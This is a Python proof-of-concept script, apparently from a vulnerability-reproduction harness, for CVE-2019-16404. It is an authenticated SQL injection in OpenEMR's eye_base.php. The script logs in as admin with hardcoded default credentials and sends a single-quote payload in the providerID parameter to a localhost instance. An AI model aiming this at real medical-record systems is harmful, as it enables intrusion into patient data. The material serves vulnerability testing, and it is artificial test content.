#!/usr/bin/env python3
"""
[APP] OpenEMR 
[CVE] CVE-2019-16404 
[TYPE] SQL injection
[METHOD] GET
[CRASH_FIELDS] providerID
[TARGET_URL] http://localhost/openemr/interface/forms/eye_mag/js/eye_base.php
[PARAMS] providerID='
OpenEMR SQL injection vulnerability that requires administrator authentication
First login to /interface/main/main_screen.php, then GET to /interface/forms/eye_mag/js/eye_base.php
"""

import sys
import os
import time

# Import standardized POC utilities
from utils import *

def main():
    # Extract metadata from this file's docstring
    metadata = get_poc_metadata_from_file(__file__)
    
    # CVE-2019-16404 specific configuration
    base_url = 'http://localhost/openemr'
    login_path = '/interface/main/main_screen.php?auth=login&site=default'
    
    # Login payload based on the provided configuration
    login_payload = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': 'admin',
        'clearPass': 'pass',
        'languageChoice': '1'
    }
    
    # Generate timestamp for this execution
    timestamp = str(int(time.time() * 1000))  # Current timestamp in milliseconds
    
    # POC target URL and payload
    poc_url = 'http://localhost/openemr/interface/forms/eye_mag/js/eye_base.php'
    poc_params = {
        'providerID': f"'{timestamp}"  # SQL injection payload - providerID parameter with timestamp and single quote
    }
    
    # Run authenticated POC test using the helper function
    # Disable coverage during login as requested
    exit_code = run_authenticated_poc(
        base_url=base_url,
        login_path=login_path,
        login_payload=login_payload,
        poc_url=poc_url,
        poc_payload=poc_params,
        method=metadata['method'],
        cve_id=metadata['cve'],
        app_name=metadata['app'],
        vuln_type=metadata['type'],
    )
    
    sys.exit(exit_code)

if __name__ == '__main__':
    main()
